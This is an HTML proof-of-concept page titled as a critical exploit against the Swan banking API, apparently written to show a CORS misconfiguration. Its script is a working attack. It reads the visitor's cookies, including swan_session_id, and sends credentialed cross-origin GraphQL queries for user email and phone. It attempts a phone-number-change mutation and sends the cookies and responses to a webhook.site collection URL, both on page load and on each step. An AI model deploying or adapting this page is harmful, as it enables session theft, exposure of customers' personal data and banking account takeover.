<!DOCTYPE html>
<html>
<head>
    <title>Swan Banking API Critical Exploit</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1, h2 { color: #c00; }
        .result { background: #f5f5f5; padding: 10px; border: 1px solid #ddd; margin: 10px 0; }
        .critical { color: #c00; font-weight: bold; }
        .success { background-color: #ffe6e6; }
        #status { margin-bottom: 20px; }
        .button {
            display: inline-block;
            background: #c00;
            color: white;
            padding: 10px 20px;
            border-radius: 4px;
            text-decoration: none;
            margin-top: 20px;
            cursor: pointer;
        }
        .button:hover {
            background: #900;
        }
    </style>
</head>
<body>
    <h1>Swan Banking API Critical Exploit</h1>
    <p>This demonstrates CRITICAL impact of CORS vulnerability</p>
    
    <div id="status">Initializing exploitation...</div>
    <div id="results"></div>
    
    <div id="actions">
        <button id="openDashboard" class="button">Open Swan Dashboard (Required)</button>
        <button id="runExploit" class="button" style="display:none;">Run Exploit</button>
    </div>
    
    <script>
        // Configuration
        const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
        const API_URL = "https://api.swan.io/admin/graphql";
        const AUTH_API_URL = "https://api.swan.io/admin-auth/graphql";
        
        // DOM Elements
        const statusEl = document.getElementById('status');
        const resultsEl = document.getElementById('results');
        const openDashboardBtn = document.getElementById('openDashboard');
        const runExploitBtn = document.getElementById('runExploit');
        
        // Global counter for successful operations
        let successCount = 0;
        
        // Update status message
        function updateStatus(message) {
            statusEl.innerHTML = message;
        }
        
        // Add result to the page
        function addResult(name, content, isSuccess = false) {
            const resultDiv = document.createElement('div');
            resultDiv.className = 'result';
            if (isSuccess) {
                resultDiv.classList.add('success');
            }
            resultDiv.innerHTML = `<h3>${name}</h3>${content}`;
            resultsEl.appendChild(resultDiv);
            
            // Send to webhook
            sendToWebhook({
                type: 'result',
                name: name,
                content: content,
                isSuccess: isSuccess,
                timestamp: new Date().toISOString()
            });
        }
        
        // Send data to webhook
        function sendToWebhook(data) {
            try {
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                });
                console.log(`Data sent to webhook: ${JSON.stringify(data).substring(0, 100)}...`);
            } catch (e) {
                console.error(`Error sending to webhook: ${e.message}`);
                // Fallback to image method
                sendViaImage(data);
            }
        }
        
        // Send data via image for fallback
        function sendViaImage(data) {
            try {
                const img = new Image();
                const jsonStr = JSON.stringify(data);
                
                // For small data, send directly
                if (jsonStr.length < 1500) {
                    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(jsonStr)}&t=${Date.now()}`;
                } else {
                    // For larger data, split into chunks
                    const chunks = Math.ceil(jsonStr.length / 1500);
                    for (let i = 0; i < chunks; i++) {
                        const chunk = jsonStr.substring(i * 1500, (i + 1) * 1500);
                        const chunkImg = new Image();
                        chunkImg.src = `${WEBHOOK_URL}?chunk=${i+1}of${chunks}&data=${encodeURIComponent(chunk)}&t=${Date.now()}`;
                    }
                }
            } catch (e) {
                console.error(`Error sending via image: ${e.message}`);
            }
        }
        
        // Extract cookies
        function extractCookies() {
            try {
                const cookies = {};
                document.cookie.split(';').forEach(cookie => {
                    if (cookie.trim()) {
                        const [name, value] = cookie.trim().split('=');
                        cookies[name] = value;
                    }
                });
                
                // Send to webhook
                sendToWebhook({
                    type: 'cookies',
                    data: cookies,
                    timestamp: new Date().toISOString()
                });
                
                // Special handling for swan_session_id
                if (cookies['swan_session_id']) {
                    sendToWebhook({
                        type: 'swan_session_id',
                        data: cookies['swan_session_id'],
                        timestamp: new Date().toISOString()
                    });
                    console.log(`Found swan_session_id: ${cookies['swan_session_id'].substring(0, 10)}...`);
                }
                
                return cookies;
            } catch (e) {
                console.error(`Error extracting cookies: ${e.message}`);
                return {};
            }
        }
        
        // Test a GraphQL query against the API
        async function testQuery(name, query, url = API_URL) {
            let resultContent = '';
            let isSuccess = false;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    credentials: 'include',  // THIS is what makes the attack work
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ query })
                });
                
                const data = await response.json();
                
                // Send raw response to webhook
                sendToWebhook({
                    type: 'api_response',
                    name: name,
                    url: url,
                    data: data,
                    timestamp: new Date().toISOString()
                });
                
                // Check for successful access - even validation errors show endpoint is accessible
                if (data.data) {
                    successCount++;
                    isSuccess = true;
                    resultContent += `
                        <p class="critical">Critical: Successful API access!</p>
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    `;
                } else if (data.errors && data.errors[0].extensions?.code === "GRAPHQL_VALIDATION_FAILED") {
                    // Even validation errors show the endpoint is accessible with credentials
                    successCount++;
                    isSuccess = true;
                    resultContent += `
                        <p class="critical">Critical: Endpoint accessible (validation error only)</p>
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    `;
                } else if (data.errors && data.errors[0].message === "Execution in Unauthenticated context forbidden") {
                    resultContent += `
                        <p>Authentication required: The endpoint requires authentication</p>
                        <pre>${JSON.stringify(data, null, 2)}</pre>
                    `;
                } else {
                    resultContent += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
                }
            } catch (error) {
                resultContent += `<p>Error: ${error.message}</p>`;
                
                // Send error to webhook
                sendToWebhook({
                    type: 'api_error',
                    name: name,
                    url: url,
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
            }
            
            addResult(name, resultContent, isSuccess);
        }
        
        // Run all exploits
        async function runCriticalExploits() {
            updateStatus("<h2>Running critical exploits...</h2>");
            
            // Extract cookies first
            extractCookies();
            
            try {
                // EXPLOIT 1: Test authentication with cookies
                await testQuery("Authentication with Cookies", `
                    query { 
                        user { 
                            id 
                            email
                            mobilePhoneNumber
                        } 
                    }
                `);
                
                // EXPLOIT 2: Test with X-Swan-Authenticator-Token
                await testQuery("Test with X-Swan-Authenticator-Token", `
                    query { 
                        user { 
                            id 
                            email
                            mobilePhoneNumber
                        } 
                    }
                `);
                
                // EXPLOIT 3: Phone Number Modification
                await testQuery("Phone Number Modification", `
                    mutation { 
                        startPhoneNumberModification(input: { 
                            oldPhoneNumber: "+33612345678", 
                            newPhoneNumber: "+33687654321" 
                        }) { 
                            __typename 
                        } 
                    }
                `, AUTH_API_URL);
                
                updateStatus(`
                    <h2>Exploitation Complete</h2>
                    <p class="critical">CRITICAL: ${successCount} banking operations accessible via CORS vulnerability</p>
                    <p>This vulnerability allows cross-origin access to core banking functions with authenticated sessions</p>
                `);
                
                // Send completion notification to webhook
                sendToWebhook({
                    type: 'exploitation_complete',
                    successCount: successCount,
                    timestamp: new Date().toISOString()
                });
            } catch (error) {
                updateStatus(`<b>Error: ${error.message}</b>`);
                
                // Send error to webhook
                sendToWebhook({
                    type: 'exploitation_error',
                    error: error.message,
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        // Open dashboard in new tab
        function openDashboard() {
            window.open('https://dashboard.swan.io/', '_blank');
            
            // Show run exploit button after 5 seconds
            setTimeout(() => {
                runExploitBtn.style.display = 'inline-block';
                updateStatus("<h2>Dashboard opened. Click 'Run Exploit' after logging in.</h2>");
            }, 5000);
        }
        
        // Set up event listeners
        openDashboardBtn.addEventListener('click', openDashboard);
        runExploitBtn.addEventListener('click', runCriticalExploits);
        
        // Initialize
        window.onload = function() {
            // Send initial ping to webhook
            sendToWebhook({
                type: 'page_loaded',
                url: window.location.href,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            });
            
            updateStatus("<h2>Click 'Open Swan Dashboard' to begin exploitation</h2>");
        };
    </script>
</body>
</html>
